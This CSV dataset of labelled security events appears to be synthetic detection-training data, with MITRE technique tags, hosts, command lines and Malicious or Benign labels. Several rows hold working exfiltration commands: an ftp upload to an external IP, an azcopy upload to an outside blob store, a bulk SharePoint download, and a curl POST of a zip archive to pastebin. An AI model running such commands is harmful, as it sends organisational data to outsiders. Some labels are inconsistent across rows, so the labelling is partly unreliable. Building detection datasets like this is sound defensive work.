"timestamp","event_id","attack_type","attack_stage","mitre_technique","source_system","source_ip","destination_ip","user","host","process_name","file_path","command_line","network_protocol","bytes_transferred","authentication_result","severity","fidelity_score","behavioral_score","anomaly_score","signature_match","asset_criticality","department","country","status","label"
"2025-01-29T09:28:44Z","EVT-100073","Data Exfiltration","Exfiltration","T1020","Firewall","10.50.15.88","45.142.212.156","vpn_user","APP-SRV-01","ftp.exe","C:\Windows\System32\ftp.exe","ftp.exe -s:C:\temp\script.txt 45.142.212.156","FTP","2147483648","Success","Critical","0.89","0.92","0.90","True","Critical","IT","CN","Active","Malicious"
"2025-02-02T12:35:22Z","EVT-100074","Data Exfiltration","Discovery","T1482","Active Directory","10.20.18.55","10.20.1.5","svc-report","DC-01","nltest.exe","C:\Windows\System32\nltest.exe","nltest.exe /domain_trusts /all_trusts","LDAP","0","Success","Low","0.61","0.65","0.62","False","Medium","IT","US","Active","Benign"
"2025-02-02T12:42:18Z","EVT-100075","Data Exfiltration","Collection","T1114.001","Exchange Server","10.20.18.55","10.20.5.25","svc-report","EXCH-02","powershell.exe","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","powershell.exe Get-Mailbox -ResultSize Unlimited | Get-MailboxStatistics | Export-Csv C:\temp\mailbox_sizes.csv","None","0","Success","Medium","0.69","0.73","0.70","False","Medium","IT","US","Active","Malicious"
"2025-02-02T13:05:47Z","EVT-100076","Data Exfiltration","Exfiltration","T1537","Cloud Logs","10.20.18.55","40.126.30.14","svc-report","N/A","azcopy.exe","C:\Program Files\AzCopy\azcopy.exe","azcopy.exe copy C:\temp\mailbox_sizes.csv https://externalstg.blob.core.windows.net/data/","HTTPS","524288","Success","High","0.78","0.82","0.79","True","Medium","IT","US","Active","Malicious"
"2025-02-04T17:48:33Z","EVT-100077","Data Exfiltration","Discovery","T1016","EDR","172.16.25.67","172.16.25.67","network_admin","WKST-NET-012","ipconfig.exe","C:\Windows\System32\ipconfig.exe","ipconfig.exe /all > C:\temp\network_info.txt","None","0","Success","Low","0.42","0.46","0.43","False","Low","IT","DE","Active","Benign"
"2025-02-04T17:55:18Z","EVT-100078","Data Exfiltration","Collection","T1213.001","SharePoint","172.16.25.67","172.16.10.50","network_admin","SP-02","powershell.exe","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","powershell.exe Connect-PnPOnline -Url https://sharepoint.company.com -UseWebLogin; Get-PnPFolder -Url /sites/IT/NetworkDocs -Recurse | Get-PnPFile -AsFile -Path C:\temp\netdocs","HTTPS","3758096384","Success","High","0.86","0.89","0.87","True","High","IT","DE","Active","Malicious"
"2025-02-04T18:32:42Z","EVT-100079","Data Exfiltration","Exfiltration","T1048.002","Proxy","172.16.25.67","185.220.101.124","network_admin","WKST-NET-012","curl.exe","C:\Windows\System32\curl.exe","curl.exe -X POST -H Content-Type: application/octet-stream --data-binary @C:\temp\netdocs.zip https://pastebin.com/api/api_post.php","HTTPS","3758096384","Success","Critical","0.90","0.93","0.91","True","High","IT","DE","Active","Malicious"
"2025-02-08T11:22:47Z","EVT-100080","Data Exfiltration","Automated Exfiltration","T1020","EDR","10.40.35.88","10.40.35.88","backup_svc","BACKUP-01","veeam.exe","C:\Program Files\Veeam\Backup\veeam.exe","veeam.exe --export --destination \\external-nas\backups --include all","SMB","107374182400","Success","Medium","0.63","0.67","0.64","False","Critical","IT","JP","Active","Benign"
"2025-01-17T08:30:15Z","EVT-100081","Benign","Normal Activity","None","Windows Event Log","10.20.15.45","10.20.15.45","sjones","WKST-FIN-033","outlook.exe","C:\Program Files\Microsoft Office\Office16\OUTLOOK.EXE","outlook.exe","None","0","Success","Low","0.12","0.15","0.13","False","Medium","Finance","US","Active","Benign"
"2025-01-17T09:15:22Z","EVT-100082","Benign","Normal Activity","None","Proxy","10.20.15.45","151.101.1.140","sjones","WKST-FIN-033","chrome.exe","C:\Program Files\Google\Chrome\Application\chrome.exe","chrome.exe https://www.bloomberg.com","HTTPS","5242880","Success","Low","0.08","0.11","0.09","False","Medium","Finance","US","Active","Benign"
"2025-01-17T10:45:33Z","EVT-100083","Benign","Normal Activity","None","EDR","10.20.15.45","10.20.15.45","sjones","WKST-FIN-033","excel.exe","C:\Program Files\Microsoft Office\Office16\EXCEL.EXE","excel.exe C:\Users\sjones\Documents\Q1_Forecast.xlsx","None","0","Success","Low","0.05","0.08","0.06","False","Medium","Finance","US","Active","Benign"
"2025-01-17T14:20:18Z","EVT-100084","Benign","Normal Activity","None","Windows Event Log","10.20.15.45","10.20.15.45","sjones","WKST-FIN-033","teams.exe","C:\Program Files\Microsoft Teams\current\Teams.exe","teams.exe","None","0","Success","Low","0.03","0.06","0.04","False","Medium","Finance","US","Active","Benign"
"2025-01-17T16:55:42Z","EVT-100085","Benign","Normal Activity","None","Windows Event Log","10.20.15.45","10.20.15.45","sjones","WKST-FIN-033","logoff.exe","C:\Windows\System32\logoff.exe","logoff.exe","None","0","Success","Low","0.02","0.05","0.03","False","Medium","Finance","US","Active","Benign"
